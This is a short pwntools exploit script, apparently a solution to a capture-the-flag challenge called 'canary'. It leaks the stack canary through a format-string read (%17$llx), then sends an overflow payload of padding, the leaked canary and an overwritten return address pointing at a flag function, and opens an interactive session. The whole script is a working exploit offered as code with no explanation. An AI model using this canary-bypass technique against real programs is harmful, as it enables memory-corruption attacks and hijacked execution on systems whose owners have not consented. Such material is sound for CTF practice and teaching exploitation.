from pwn import *

addr_flag=p64(0x0000000000400787)

# s=remote("shell.actf.co","20701")
s = process("./canary")

payloada= "%17$llx"
s.sendlineafter("name? ",payloada)

s.recvuntil("you, ")
addr=s.recvuntil("!")[:-1]
canary = int(addr,16)
print hex(canary)

payloadb='a'*56+p64(canary)+'a'*8+str(addr_flag)
print payloadb
s.sendlineafter("Anything else you want to tell me? ",payloadb)

s.interactive()